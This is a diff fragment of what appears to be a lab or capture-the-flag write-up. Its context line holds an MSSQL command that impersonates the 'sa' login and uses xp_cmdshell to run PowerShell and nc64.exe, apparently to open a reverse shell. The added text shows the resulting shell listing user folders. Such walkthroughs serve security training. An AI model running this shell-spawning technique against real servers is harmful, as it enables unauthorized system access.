@@ -292,5 +292,30 @@ EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell -c C:\ProgramData\nc64.exe
 
 I now have a shell
 
+```python
+PS C:\Users> dir
+dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        10/3/2026   2:03 PM                Administrator                                                         
+d-----        5/28/2024  10:23 AM                lkazanof                                                              
+d-----        5/28/2024  10:23 AM                lorra199                                                              
+d-----        5/28/2024  10:22 AM                mikasaAckerman                                                        
+d-----        8/27/2023   1:16 AM                MSSQLSERVER                                                           
+d-r---        5/28/2024   2:13 PM                Public                                                                
+d-----        5/28/2024  10:22 AM                sqlbackupoperator                                                     
+d-----        5/28/2024  11:16 AM                sql_svc                                                               
+
+
+PS C:\Users> 
+```
+
+There are quite a few users here
+
 
 
